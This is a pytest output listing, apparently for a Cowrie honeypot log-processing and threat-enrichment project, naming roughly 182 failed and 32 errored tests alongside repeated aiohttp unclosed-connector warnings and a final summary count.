FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_longtail_migrate_sqlalchemy2
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_longtail_rollback_sqlalchemy2
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_validate_longtail_schema_sqlalchemy2
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_backfill_files_table_sqlalchemy2
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_create_backup_sqlalchemy2
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_progress_callback_type_safety
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_sqlalchemy_20_patterns
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_type_annotations_consistency
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_error_handling_type_safety
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_database_connection_type_safety
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestSQLAlchemy20CompatibilityIntegration::test_no_deprecated_patterns_in_code
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestSQLAlchemy20CompatibilityIntegration::test_proper_connection_patterns
FAILED tests/integration/test_enrichment_flow.py::test_high_risk_session_full_enrichment
FAILED tests/integration/test_enrichment_integration.py::TestEnrichmentMetadataInReports::test_session_report_includes_enrichment_data
FAILED tests/integration/test_enrichment_integration.py::TestEnrichmentMetadataInReports::test_file_report_includes_vt_enrichment
FAILED tests/integration/test_enrichment_integration.py::TestConcurrentEnrichmentProcessing::test_enrichment_rate_limiting_simulation
FAILED tests/integration/test_enrichment_integration.py::TestEnrichmentDataConsistency::test_enrichment_data_persistence_across_calls
FAILED tests/integration/test_enrichment_integration.py::TestEnrichmentDataConsistency::test_enrichment_data_isolation_between_ips
FAILED tests/integration/test_enrichment_integration.py::TestEnrichmentErrorRecovery::test_partial_enrichment_failure_recovery
FAILED tests/integration/test_enrichment_integration.py::TestEnrichmentErrorRecovery::test_complete_enrichment_failure_recovery
FAILED tests/integration/test_enrichment_integration.py::TestEnrichmentPerformanceScenarios::test_bulk_enrichment_performance
FAILED tests/integration/test_enrichment_reports.py::TestEnrichmentInSessionReports::test_session_report_includes_dshield_data
FAILED tests/integration/test_enrichment_reports.py::TestEnrichmentInSessionReports::test_session_report_includes_spur_data
FAILED tests/integration/test_enrichment_reports.py::TestEnrichmentInSessionReports::test_session_report_includes_urlhaus_data
FAILED tests/integration/test_enrichment_reports.py::TestEnrichmentInSessionReports::test_multiple_sessions_enrichment_consistency
FAILED tests/integration/test_enrichment_reports.py::TestEnrichmentInFileReports::test_file_report_includes_vt_data
FAILED tests/integration/test_enrichment_reports.py::TestEnrichmentInFileReports::test_file_report_enrichment_metadata
FAILED tests/integration/test_enrichment_reports.py::TestReportEnrichmentIntegration::test_daily_report_includes_enrichment_summary
FAILED tests/integration/test_enrichment_reports.py::TestReportEnrichmentIntegration::test_abnormal_activity_report_enrichment_flags
FAILED tests/integration/test_enrichment_reports.py::TestEnrichmentReportFormatting::test_enrichment_data_formatting_consistency
FAILED tests/integration/test_enrichment_reports.py::TestEnrichmentReportFormatting::test_enrichment_tags_parsing_and_display
FAILED tests/integration/test_enrichment_reports.py::TestEnrichmentReportFormatting::test_vt_classification_display
FAILED tests/integration/test_migration_system.py::TestMigrationSystem::test_migration_application_sqlite
FAILED tests/integration/test_migration_system.py::TestMigrationSystem::test_migration_idempotency_sqlite
FAILED tests/integration/test_migration_system.py::TestMigrationSystem::test_migration_with_data_sqlite
FAILED tests/integration/test_migration_system.py::TestMigrationSystem::test_migration_error_handling
FAILED tests/integration/test_migration_system.py::TestMigrationSystem::test_migration_from_scratch
FAILED tests/integration/test_migration_system.py::TestMigrationCompatibility::test_boolean_defaults_migration
FAILED tests/integration/test_migration_system.py::TestMigrationCompatibility::test_json_extraction_migration
FAILED tests/integration/test_migration_system.py::TestMigrationIntegration::test_full_migration_cycle
FAILED tests/integration/test_password_enrichment.py::test_end_to_end_password_enrichment
FAILED tests/integration/test_password_enrichment.py::test_novel_password_tracking
FAILED tests/integration/test_refresh_cache_sqlalchemy2.py::TestRefreshCacheIntegration::test_refresher_seed_missing_integration
FAILED tests/integration/test_refresh_cache_sqlalchemy2.py::TestRefreshCacheIntegration::test_refresh_reports_integration
FAILED tests/integration/test_refresh_cache_sqlalchemy2.py::TestRefreshCacheIntegration::test_type_annotations_consistency
FAILED tests/integration/test_reporting_queries.py::TestReportingQueries::test_session_stats_with_json_abstraction
FAILED tests/integration/test_reporting_queries.py::TestReportingQueries::test_top_commands_with_json_abstraction
FAILED tests/integration/test_reporting_queries.py::TestReportingQueries::test_top_file_downloads_with_json_abstraction
FAILED tests/integration/test_reporting_queries.py::TestReportingQueries::test_reporting_queries_without_sensor_filter
FAILED tests/integration/test_reporting_queries.py::TestReportingIntegration::test_full_reporting_workflow
FAILED tests/integration/test_snowshoe_integration.py::TestSnowshoeIntegration::test_mixed_traffic_detection
FAILED tests/integration/test_unicode_handling_integration.py::TestUnicodeHandlingIntegration::test_dlq_processing_repairs_unicode_issues
FAILED tests/integration/test_virustotal_integration.py::TestVirusTotalIntegration::test_enrichment_service_with_vt_handler
FAILED tests/performance/test_enrichment_performance.py::TestEnrichmentCachePerformance::test_cache_hit_performance
FAILED tests/performance/test_enrichment_performance.py::TestEnrichmentCachePerformance::test_cache_miss_performance
FAILED tests/performance/test_enrichment_performance.py::TestEnrichmentCachePerformance::test_concurrent_cache_access_performance
FAILED tests/performance/test_enrichment_performance.py::TestEnrichmentCachePerformance::test_cache_ttl_performance
FAILED tests/performance/test_enrichment_performance.py::TestEnrichmentTimeoutPerformance::test_timeout_enforcement
FAILED tests/performance/test_enrichment_performance.py::TestEnrichmentTimeoutPerformance::test_timeout_with_cache_fallback
FAILED tests/performance/test_enrichment_performance.py::TestEnrichmentTimeoutPerformance::test_bulk_timeout_handling
FAILED tests/performance/test_enrichment_performance.py::TestConcurrentEnrichmentPerformance::test_concurrent_ip_enrichment
FAILED tests/performance/test_enrichment_performance.py::TestConcurrentEnrichmentPerformance::test_concurrent_file_enrichment
FAILED tests/performance/test_enrichment_performance.py::TestMockHandlerPerformance::test_mock_abuseipdb_performance
FAILED tests/performance/test_enrichment_performance.py::TestMemoryUsagePerformance::test_memory_usage_during_bulk_enrichment
FAILED tests/performance/test_enrichment_performance.py::TestMemoryUsagePerformance::test_cache_memory_efficiency
FAILED tests/performance/test_enrichment_performance.py::TestEnrichmentThroughput::test_sequential_throughput
FAILED tests/performance/test_enrichment_performance.py::TestEnrichmentThroughput::test_cached_throughput
FAILED tests/performance/test_snowshoe_performance.py::TestSnowshoePerformance::test_snowshoe_detection_performance_100k_sessions
FAILED tests/performance/test_snowshoe_performance.py::TestSnowshoePerformance::test_mixed_traffic_performance_100k_sessions
FAILED tests/performance/test_snowshoe_performance.py::TestSnowshoePerformance::test_concurrent_analysis_performance
FAILED tests/performance/test_snowshoe_performance.py::TestSnowshoePerformance::test_scalability_with_different_sizes
FAILED tests/performance/test_snowshoe_performance.py::TestSnowshoePerformance::test_metrics_performance_integration
FAILED tests/unit/test_bulk_loader.py::test_bulk_loader_inserts_raw_events - ...
FAILED tests/unit/test_bulk_loader.py::test_bulk_loader_is_idempotent - sqlal...
FAILED tests/unit/test_bulk_loader.py::test_bulk_loader_handles_multiline_json
FAILED tests/unit/test_bulk_loader.py::test_bulk_loader_rejects_multiline_json_by_default
FAILED tests/unit/test_bulk_loader.py::test_bulk_loader_mixed_json_formats - ...
FAILED tests/unit/test_bulk_loader.py::test_bulk_loader_sets_enrichment_flags
FAILED tests/unit/test_bulk_loader.py::test_bulk_loader_multiline_json_malformed_limit
FAILED tests/unit/test_bulk_loader_defanging.py::TestIntelligentDefanging::test_safe_commands_not_quarantined
FAILED tests/unit/test_bulk_loader_defanging.py::TestIntelligentDefanging::test_dangerous_commands_defanged_not_quarantined
FAILED tests/unit/test_bulk_loader_defanging.py::TestIntelligentDefanging::test_legacy_neutralization_still_works
FAILED tests/unit/test_bulk_loader_defanging.py::TestIntelligentDefanging::test_command_analysis_preserved
FAILED tests/unit/test_bulk_loader_defanging.py::TestIntelligentDefanging::test_risk_scoring_improved
FAILED tests/unit/test_bulk_loader_defanging.py::TestIntelligentDefanging::test_no_original_preservation_when_disabled
FAILED tests/unit/test_bulk_loader_defanging.py::TestIntelligentDefanging::test_mixed_command_types
FAILED tests/unit/test_bulk_loader_defanging.py::TestBackwardCompatibility::test_existing_tests_still_pass
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabase::test_get_schema_version
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabase::test_validate_schema
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabase::test_migrate_dry_run
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabase::test_create_backup
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabase::test_create_backup_custom_path
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabase::test_verify_backup_integrity_valid
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabase::test_check_integrity
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabase::test_check_integrity_deep
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabase::test_optimize_vacuum_only
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabase::test_optimize_reindex_only
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabaseCLI::test_migrate_command
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabaseCLI::test_check_command
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabaseCLI::test_backup_command
FAILED tests/unit/test_cowrie_db_cli.py::TestCowrieDatabaseCLI::test_integrity_command
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_table_exists_return_type
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_table_exists_not_found
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_validate_schema_return_type
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_optimize_return_type
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_create_backup_return_type
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_check_integrity_return_type
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_files_table_stats_return_type
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_backfill_files_table_return_type
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_analyze_data_quality_return_type
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_repair_data_quality_return_type
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_migrate_to_postgresql_return_type
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_longtail_migrate_return_type
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_longtail_rollback_return_type
FAILED tests/unit/test_cowrie_db_types.py::TestCowrieDatabaseTypes::test_validate_longtail_schema_return_type
FAILED tests/unit/test_cowrie_db_types.py::TestSQLAlchemy20Compatibility::test_no_deprecated_query_patterns
FAILED tests/unit/test_delta_loader.py::test_delta_loader_ingests_only_new_events
FAILED tests/unit/test_delta_loader.py::test_delta_loader_handles_file_rotation
FAILED tests/unit/test_delta_loader.py::test_delta_loader_records_dead_letters
FAILED tests/unit/test_enrichment_handlers.py::test_vt_query_handles_404_response
FAILED tests/unit/test_enrichment_handlers.py::test_read_spur_data_handles_nested_client_schema
FAILED tests/unit/test_enrichment_handlers.py::test_all_services_handle_empty_api_keys
FAILED tests/unit/test_enrichment_handlers.py::test_malformed_responses_handled_gracefully
FAILED tests/unit/test_health_cli.py::test_health_cli_json - assert 1 == 0
FAILED tests/unit/test_health_cli.py::test_health_cli_missing_status - Assert...
FAILED tests/unit/test_mock_enrichment_handlers.py::TestMockOTXHandler::test_otx_check_ip_handles_private_ips
FAILED tests/unit/test_mock_enrichment_handlers.py::TestMockOTXHandler::test_otx_check_ip_handles_suspicious_ips
FAILED tests/unit/test_mock_enrichment_handlers.py::TestMockOTXHandler::test_otx_check_file_hash_handles_known_bad_hashes
FAILED tests/unit/test_mock_enrichment_handlers.py::TestMockOTXHandler::test_otx_check_file_hash_handles_known_good_hashes
FAILED tests/unit/test_mock_enrichment_handlers.py::TestMockAbuseIPDBHandler::test_abuseipdb_custom_max_age
FAILED tests/unit/test_process_cowrie.py::test_secret_reference_resolution - ...
FAILED tests/unit/test_process_cowrie.py::test_bulk_load_skips_commits - Asse...
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_timeout_handler_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_with_timeout_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_cache_get_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_cache_upsert_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_get_connected_sessions_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_get_session_id_type_annotations2025-10-18 18:33:03,297:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566f85c1d0>, 1467443.450758845)])']
connector: <aiohttp.connector.TCPConnector object at 0x77566c245310>
2025-10-18 18:33:03,297:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566f85c1d0>, 1467443.450758845)])']
connector: <aiohttp.connector.TCPConnector object at 0x77566c245310>
Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566f85c1d0>, 1467443.450758845)])']
connector: <aiohttp.connector.TCPConnector object at 0x77566c245310>
Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566f85c1d0>, 1467443.450758845)])']
connector: <aiohttp.connector.TCPConnector object at 0x77566c245310>
2025-10-18 18:33:03,297:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566f85c1d0>, 1467443.450758845)])']
connector: <aiohttp.connector.TCPConnector object at 0x77566c245310>
2025-10-18 18:33:03,297:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566f85c1d0>, 1467443.450758845)])']
connector: <aiohttp.connector.TCPConnector object at 0x77566c245310>
2025-10-18 18:33:03,297:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566f85c1d0>, 1467443.450758845)])']
connector: <aiohttp.connector.TCPConnector object at 0x77566c245310>
2025-10-18 18:33:03,297:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566f85c1d0>, 1467443.450758845)])']
connector: <aiohttp.connector.TCPConnector object at 0x77566c245310>
2025-10-18 18:33:03,297:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566f85c1d0>, 1467443.450758845)])']
connector: <aiohttp.connector.TCPConnector object at 0x77566c245310>
2025-10-18 18:33:03,297:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566f85c1d0>, 1467443.450758845)])']
connector: <aiohttp.connector.TCPConnector object at 0x77566c245310>
2025-10-18 18:33:03,297:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566f85c1d0>, 1467443.450758845)])']
connector: <aiohttp.connector.TCPConnector object at 0x77566c245310>
2025-10-18 18:33:03,297:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566f85c1d0>, 1467443.450758845)])']
connector: <aiohttp.connector.TCPConnector object at 0x77566c245310>
2025-10-18 18:33:03,461:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566b41e810>, 1467443.214086242)])']
connector: <aiohttp.connector.TCPConnector object at 0x7756b2b17c50>
2025-10-18 18:33:03,461:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566b41e810>, 1467443.214086242)])']
connector: <aiohttp.connector.TCPConnector object at 0x7756b2b17c50>
Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566b41e810>, 1467443.214086242)])']
connector: <aiohttp.connector.TCPConnector object at 0x7756b2b17c50>
Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566b41e810>, 1467443.214086242)])']
connector: <aiohttp.connector.TCPConnector object at 0x7756b2b17c50>
2025-10-18 18:33:03,461:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566b41e810>, 1467443.214086242)])']
connector: <aiohttp.connector.TCPConnector object at 0x7756b2b17c50>
2025-10-18 18:33:03,461:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566b41e810>, 1467443.214086242)])']
connector: <aiohttp.connector.TCPConnector object at 0x7756b2b17c50>
2025-10-18 18:33:03,461:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566b41e810>, 1467443.214086242)])']
connector: <aiohttp.connector.TCPConnector object at 0x7756b2b17c50>
2025-10-18 18:33:03,461:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566b41e810>, 1467443.214086242)])']
connector: <aiohttp.connector.TCPConnector object at 0x7756b2b17c50>
2025-10-18 18:33:03,461:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566b41e810>, 1467443.214086242)])']
connector: <aiohttp.connector.TCPConnector object at 0x7756b2b17c50>
2025-10-18 18:33:03,461:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566b41e810>, 1467443.214086242)])']
connector: <aiohttp.connector.TCPConnector object at 0x7756b2b17c50>
2025-10-18 18:33:03,461:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566b41e810>, 1467443.214086242)])']
connector: <aiohttp.connector.TCPConnector object at 0x7756b2b17c50>
2025-10-18 18:33:03,461:ERROR:asyncio:base_events.py:default_exception_handler:Unclosed connector
connections: ['deque([(<aiohttp.client_proto.ResponseHandler object at 0x77566b41e810>, 1467443.214086242)])']
connector: <aiohttp.connector.TCPConnector object at 0x7756b2b17c50>

FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_get_session_duration_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_get_protocol_login_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_get_login_data_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_get_command_total_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_get_file_download_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_get_file_upload_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_dshield_query_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_safe_read_uh_data_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_read_spur_data_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_read_vt_data_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_print_session_info_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_get_commands_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_evaluate_sessions_type_annotations
FAILED tests/unit/test_process_cowrie_types.py::TestProcessCowrieTypes::test_no_deprecated_query_patterns
FAILED tests/unit/test_quarantine_payload_fix.py::TestQuarantinePayloadFix::test_malformed_json_has_content_in_dead_letters
FAILED tests/unit/test_quarantine_payload_fix.py::TestQuarantinePayloadFix::test_non_dict_payload_creates_dead_letter
FAILED tests/unit/test_quarantine_payload_fix.py::TestQuarantinePayloadFix::test_dead_letter_events_preserve_content
FAILED tests/unit/test_quarantine_payload_fix.py::TestQuarantinePayloadFix::test_no_empty_payloads_in_quarantined_events
FAILED tests/unit/test_rate_limiting.py::TestServiceRateLimits::test_service_rate_limits_exist
FAILED tests/unit/test_rate_limiting.py::TestServiceRateLimits::test_get_service_rate_limit
FAILED tests/unit/test_refresh_cache_types.py::TestRefreshCacheTypes::test_parse_args_type_annotations
FAILED tests/unit/test_refresh_cache_types.py::TestRefreshCacheTypes::test_ensure_indicator_table_type_annotations
FAILED tests/unit/test_refresh_cache_types.py::TestRefreshCacheTypes::test_refresher_init_type_annotations
FAILED tests/unit/test_refresh_cache_types.py::TestRefreshCacheTypes::test_refresher_cache_get_type_annotations
FAILED tests/unit/test_refresh_cache_types.py::TestRefreshCacheTypes::test_refresher_should_refresh_vt_type_annotations
FAILED tests/unit/test_refresh_cache_types.py::TestRefreshCacheTypes::test_refresher_should_refresh_ip_type_annotations
FAILED tests/unit/test_refresh_cache_types.py::TestRefreshCacheTypes::test_refresh_reports_type_annotations
FAILED tests/unit/test_report_cli.py::test_report_cli_dry_run - SystemExit: 2
FAILED tests/unit/test_report_cli.py::test_report_cli_all_sensors - SystemExi...
FAILED tests/unit/test_schema_migrations.py::test_apply_migrations_creates_tables
FAILED tests/unit/test_schema_migrations.py::test_raw_event_computed_columns
FAILED tests/unit/test_schema_migrations.py::test_apply_migrations_idempotent
ERROR scripts/test_longtail_with_database.py::test_database_connectivity
ERROR test_migration.py::test_migration
ERROR tests/integration/test_enrichment_integration.py::TestSessionEnrichmentIntegration::test_session_enrichment_with_all_services
ERROR tests/integration/test_enrichment_integration.py::TestSessionEnrichmentIntegration::test_file_enrichment_integration
ERROR tests/integration/test_enrichment_integration.py::TestConcurrentEnrichmentProcessing::test_multiple_sessions_enrichment
ERROR tests/integration/test_files_enrichment_flow.py::TestFileEnrichmentFlow::test_bulk_loader_processes_file_events
ERROR tests/integration/test_files_enrichment_flow.py::TestFileEnrichmentFlow::test_files_table_enrichment_status
ERROR tests/integration/test_files_enrichment_flow.py::TestFileEnrichmentFlow::test_duplicate_file_handling
ERROR tests/integration/test_files_enrichment_flow.py::TestFileEnrichmentFlow::test_file_metadata_preservation
ERROR tests/integration/test_files_enrichment_flow.py::TestFileEnrichmentFlow::test_invalid_file_events_handling
ERROR tests/integration/test_files_enrichment_flow.py::TestFileEnrichmentFlow::test_session_summary_file_count_integration
ERROR tests/integration/test_files_enrichment_flow.py::TestFileEnrichmentFlow::test_files_table_indexes
ERROR tests/integration/test_longtail_storage.py::TestLongtailStorage::test_store_longtail_analysis_basic
ERROR tests/integration/test_longtail_storage.py::TestLongtailStorage::test_pgvector_detection_sqlite
ERROR tests/integration/test_longtail_storage.py::TestLongtailStorage::test_analysis_checkpoints
ERROR tests/integration/test_longtail_storage.py::TestLongtailStorage::test_storage_with_empty_results
ERROR tests/integration/test_longtail_storage.py::TestLongtailStorage::test_session_linking_integrity
ERROR tests/integration/test_longtail_storage.py::TestLongtailStorage::test_error_handling
ERROR tests/integration/test_longtail_storage.py::TestLongtailIntegration::test_run_longtail_analysis_with_storage
ERROR tests/integration/test_ssh_key_enrichment.py::TestSSHKeyExtractionIntegration::test_extract_and_store_ssh_keys
ERROR tests/integration/test_ssh_key_enrichment.py::TestSSHKeyExtractionIntegration::test_session_key_linking
ERROR tests/integration/test_ssh_key_enrichment.py::TestSSHKeyAnalyticsIntegration::test_campaign_detection
ERROR tests/integration/test_ssh_key_enrichment.py::TestSSHKeyAnalyticsIntegration::test_key_timeline_analysis
ERROR tests/integration/test_ssh_key_enrichment.py::TestSSHKeyAnalyticsIntegration::test_related_keys_analysis
ERROR tests/integration/test_ssh_key_enrichment.py::TestSSHKeyAnalyticsIntegration::test_geographic_spread_analysis
ERROR tests/integration/test_ssh_key_enrichment.py::TestSessionSummaryIntegration::test_session_summary_ssh_key_counts
ERROR tests/integration/test_ssh_key_enrichment.py::TestEndToEndIntegration::test_full_enrichment_pipeline
ERROR tests/performance/test_files_backfill.py::TestFilesBackfillPerformance::test_bulk_loader_performance
ERROR tests/performance/test_files_backfill.py::TestFilesBackfillPerformance::test_memory_usage_stability
ERROR tests/performance/test_files_backfill.py::TestFilesBackfillPerformance::test_batch_size_optimization
ERROR tests/performance/test_files_backfill.py::TestFilesBackfillPerformance::test_concurrent_access_during_backfill
ERROR tests/performance/test_files_backfill.py::TestFilesBackfillPerformance::test_large_file_metadata_handling
= 182 failed, 533 passed, 2 skipped, 32 warnings, 32 errors in 3254.98s (0:54:14) =
